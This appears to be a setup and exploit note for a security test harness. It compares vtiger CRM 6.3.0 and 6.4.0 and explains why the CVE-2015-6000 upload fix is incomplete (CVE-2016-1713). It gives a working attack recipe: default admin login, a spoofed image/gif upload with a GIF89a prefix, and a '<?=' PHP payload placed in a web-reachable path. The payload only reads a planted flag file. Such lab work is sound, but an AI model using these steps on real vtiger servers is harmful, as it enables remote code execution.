## Recipe (no vendored app source / images committed)
  Prebuilt recipe images from Docker Hub (javanile/vtiger), which bake the official vtiger
  SourceForge release + a fresh install DB dump on php:5.6.40-apache:
    V0 = javanile/vtiger:6.3.0    V1 = javanile/vtiger:6.4.0   (both pulled --platform linux/amd64)
  A mariadb:10.5 sidecar per version imports the baked dump at boot (the image's own
  vtiger-foreground.sh runs `mysql-import --do-while vtiger.sql`). MYSQL_TYPE=mysqli is forced
  because the image ships only the mysqli PHP ext (not the legacy `mysql` ext). App connects as
  root/secret to database `vtiger`. The compose `command` plants $PCB_FLAG -> /flag/pcb_flag.txt
  (outside /var/www/html) then exec's vtiger-foreground.sh. No vtiger business code is modified.
  Admin account is the install default (admin/admin), seeded by the baked dump.

## Roles
  V0 = vtiger 6.3.0 (port 39460) — CVE-2015-6000 unpatched (no server-side mime sniff)
  V1 = vtiger 6.4.0 (port 39461) — CVE-2015-6000 patched (mime sniff added); CVE-2016-1713 residual  <- TARGET

## Mechanism (source-verified: CompanyDetailsSave.php + CompanyDetails.php extracted from BOTH images; see patch.diff)
  SINK = Settings_Vtiger_CompanyDetailsSave_Action::process() -> CompanyDetails_Model::saveLogo():
       $logoName = vglobal('root_directory').'/test/logo/'.$_FILES["logo"]["name"];   // verbatim name+ext
       move_uploaded_file($_FILES["logo"]["tmp_name"], $logoName);                    // no re-encode
       -> stored file is web-reachable at /test/logo/<name>.php and executes (php:5.6-apache, AllowOverride All).
  GUARDS present in BOTH 6.3.0 and 6.4.0:
       1. client MIME:  explode('/', $_FILES['logo']['type'])[1] in {jpeg,jpg,png,gif,pjpeg,x-png}
                        -> attacker sets multipart Content-Type: image/gif (trivially bypassed).
       2. content regex: preg_match('/(<\?php?(.*?))/i', file_get_contents(tmp)) -> only matches literal
                        '<?ph'/'<?php'. The '<?=' short-echo tag is NOT matched -> executable PHP passes (BOTH versions).
  CVE-2015-6000 fix ADDED in 6.4.0 (V1) — the ONLY delta:
       //mime type check
       $mimeType = mime_content_type($logoDetails['tmp_name']);
       $mimeTypeContents = explode('/', $mimeType);
       if (... $mimeTypeContents[0] != 'image' || !in_array($mimeTypeContents[1], $logoSupportedFormats)) $saveLogo=false;
  INCOMPLETE (CVE-2016-1713): sniffs only CONTENT, never the stored name/extension. A file that BEGINS
       with real GIF89a magic sniffs as image/gif yet still executes as PHP (test/logo/<name>.php).

## Payloads (driven through vtiger's real Settings>CompanyDetails logo-upload flow; no app code touched)
  login admin/admin -> GET CompanyDetails (scrape __vtrftk) -> multipart POST CompanyDetailsSave with logo=(...)
  PHP body (both):  <?=@file_get_contents('/flag/pcb_flag.txt')?>   (reads canary; '<?=' evades the content regex)
  seed     (CVE-2015-6000): logo = ("pcb_seed_<nonce>.php",  <PHP>,          "image/gif")   -> no image magic
  residual (CVE-2016-1713): logo = ("pcb_bypass_<nonce>.php", GIF89a + <PHP>, "image/gif")   -> real GIF magic
  then GET /test/logo/<name>.php

